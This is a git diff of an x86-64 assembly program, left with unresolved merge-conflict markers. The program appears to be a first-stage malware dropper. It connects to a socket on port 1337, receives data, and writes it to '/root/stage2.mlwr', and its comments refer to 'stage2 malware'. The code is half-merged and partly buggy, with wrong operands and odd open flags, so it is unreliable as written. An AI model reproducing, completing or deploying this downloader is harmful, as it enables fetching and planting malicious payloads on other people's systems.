@@ -13,9 +13,15 @@ section .bss
 	port resw 2
 	bytes_read resw 2
 	file_buff resb 8092
+<<<<<<< HEAD
+	stage2_fd resw 1
+=======
 	file_data resb 8092
+>>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2
 
 section .data
+	file_name db '/root/stage2.mlwr', 0x0 ;null termination is necessary - will solve this later at time of sc conv
+	;file_data db 'Hi I am stage2 malware', 0x0
 	pop_sa istruc sockaddr_in
 		at sockaddr_in.sin_family, dw 2
 		at sockaddr_in.sin_port, dw 0x3905
@@ -63,6 +69,27 @@ _connect:
 	syscall
 
 	ret
+<<<<<<< HEAD
+	
+_fops:	
+	xor rax, rax 
+        mov rax, 2
+        lea rdi, [file_name]
+        mov rsi, 1
+        mov rdx, 1
+        syscall
+
+        mov [stage2_fd], rax 
+
+        xor rax, rax 
+        mov rax, 1
+        mov rdi ,[stage2_fd]
+        lea rsi, [file_buff]
+        mov rdx, 8092
+        syscall
+	
+	ret
+=======
 
 print_data:
 	mov rax, 1
@@ -71,6 +98,7 @@ print_data:
 	mov rdx, 8092
 	syscall
 	call exit_gracefully
+>>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2
 
 _fcopy:
 	mov rax, 45 ; recvfrom syscall no
@@ -84,9 +112,22 @@ _fcopy:
 	syscall 
 	mov [bytes_read], rax	
 
+<<<<<<< HEAD
+	mov rax, 1
+	mov rdi, 1
+	mov rsi, [file_buff]
+	mov rdx, 8092
+	syscall
+	
+	call _fops
+	;loop _fcopy	
+	
+	ret
+=======
 	jmp print_data
 
 	loop _fcopy	
+>>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2
 
 connect_to_site:
 	
